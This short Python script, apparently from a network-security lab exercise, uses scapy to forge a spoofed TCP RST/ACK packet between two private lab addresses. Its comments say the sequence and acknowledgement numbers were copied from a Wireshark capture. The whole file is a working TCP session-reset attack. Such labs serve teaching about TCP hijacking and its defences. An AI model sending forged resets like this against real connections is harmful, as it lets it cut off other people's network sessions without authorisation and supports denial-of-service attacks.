#!/usr/bin/python3
import sys
from scapy.all import *

# EDITED BY DC
# SRC = M2 IP
# DEST = M3 IP
# Got values from wire shark
# Use sequence that is "Next sequence num" in last packet in wire shark

print("SENDING RESET PACKET.........")
IPLayer = IP(src="172.17.0.2", dst="172.17.0.3")
TCPLayer = TCP(sport=1234, dport=52872,flags="RA", seq=2775365969, ack=579873452)
pkt = IPLayer/TCPLayer
ls(pkt)
send(pkt, verbose=0)

